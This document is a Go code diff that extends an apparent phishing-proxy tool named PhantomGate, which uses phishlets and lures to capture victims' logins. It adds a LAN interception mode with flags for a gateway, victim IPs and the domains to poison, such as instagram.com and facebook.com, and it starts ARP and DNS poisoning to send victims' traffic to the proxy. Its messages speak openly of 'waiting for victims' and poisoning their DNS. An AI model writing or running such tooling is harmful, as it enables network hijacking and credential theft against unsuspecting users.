@@ -5,6 +5,7 @@ import (
 	"flag"
 	"fmt"
 	"log"
+	"net"
 	"net/http"
 	"os"
 	"os/signal"
@@ -14,6 +15,7 @@ import (
 	"github.com/phantomgate/phantomgate/internal/capture"
 	"github.com/phantomgate/phantomgate/internal/config"
 	"github.com/phantomgate/phantomgate/internal/dashboard"
+	pgdns "github.com/phantomgate/phantomgate/internal/dns"
 	"github.com/phantomgate/phantomgate/internal/lure"
 	"github.com/phantomgate/phantomgate/internal/phishlet"
 	"github.com/phantomgate/phantomgate/internal/proxy"
@@ -56,6 +58,13 @@ func main() {
 	storeFile := flag.String("store", "phantomgate_data.json", "Path to data store file")
 	listPhishlets := flag.Bool("list", false, "List available phishlets and exit")
 	createLure := flag.String("lure", "", "Create a lure URL for the specified victim info")
+
+	// DNS Interception flags
+	intercept := flag.Bool("intercept", false, "Enable DNS interception mode (ARP + DNS poisoning on LAN)")
+	ifaceName := flag.String("iface", "eth0", "Network interface for interception")
+	gatewayIP := flag.String("gateway", "", "Gateway IP for ARP poisoning")
+	victimIPs := flag.String("victim-ip", "", "Comma-separated victim IPs (empty = entire subnet)")
+	poisonDomains := flag.String("poison-domain", "", "Comma-separated domains to poison (e.g., instagram.com,facebook.com)")
 
 	flag.Parse()
 
@@ -216,7 +225,73 @@ func main() {
 		}
 	}()
 
+	// === DNS INTERCEPTION MODE ===
+	var interceptSuite *pgdns.InterceptSuite
+	if *intercept {
+		if *gatewayIP == "" {
+			log.Fatal("[FATAL] --gateway is required for interception mode")
+		}
+
+		// Parse victim IPs
+		var victims []string
+		if *victimIPs != "" {
+			for _, ip := range strings.Split(*victimIPs, ",") {
+				victims = append(victims, strings.TrimSpace(ip))
+			}
+		}
+
+		// Parse poison domains (default: use phishlet proxy hosts)
+		var domains []string
+		if *poisonDomains != "" {
+			for _, d := range strings.Split(*poisonDomains, ",") {
+				domains = append(domains, strings.TrimSpace(d))
+			}
+		} else {
+			// Auto-detect from phishlet
+			for _, h := range activePhishlet.ProxyHosts {
+				domains = append(domains, h.OrigSub)
+			}
+		}
+
+		// Determine our IP for redirection
+		redirectIP := cfg.ListenIP
+		if redirectIP == "0.0.0.0" {
+			// Try to get the IP of the specified interface
+			redirectIP = *gatewayIP // Fallback; will be overridden
+			if iface, err := net.InterfaceByName(*ifaceName); err == nil {
+				if addrs, err := iface.Addrs(); err == nil {
+					for _, addr := range addrs {
+						if ipNet, ok := addr.(*net.IPNet); ok && ipNet.IP.To4() != nil {
+							redirectIP = ipNet.IP.String()
+							break
+						}
+					}
+				}
+			}
+		}
+
+		var err error
+		interceptSuite, err = pgdns.NewInterceptSuite(pgdns.InterceptConfig{
+			Interface:     *ifaceName,
+			GatewayIP:     *gatewayIP,
+			RedirectIP:    redirectIP,
+			TargetDomains: domains,
+			VictimIPs:     victims,
+			ARPInterval:   2,
+		})
+		if err != nil {
+			log.Fatalf("[FATAL] Interception suite failed: %v", err)
+		}
+
+		if err := interceptSuite.Start(); err != nil {
+			log.Fatalf("[FATAL] Failed to start interception: %v", err)
+		}
+	}
+
 	fmt.Println("  ⚡ PhantomGate is LIVE. Waiting for victims...")
+	if *intercept {
+		fmt.Println("  ☠️  DNS interception mode ACTIVE — victims' DNS is being poisoned")
+	}
 	fmt.Println("  Press Ctrl+C to shutdown.\n")
 
 	// Graceful shutdown
@@ -225,6 +300,12 @@ func main() {
 	<-sigChan
 
 	fmt.Println("\n  [!] Shutting down PhantomGate...")
+
+	// Stop interception first (restore network state)
+	if interceptSuite != nil {
+		interceptSuite.Stop()
+	}
+
 	fmt.Println("  [✓] All data saved. Goodbye.\n")
 }
 
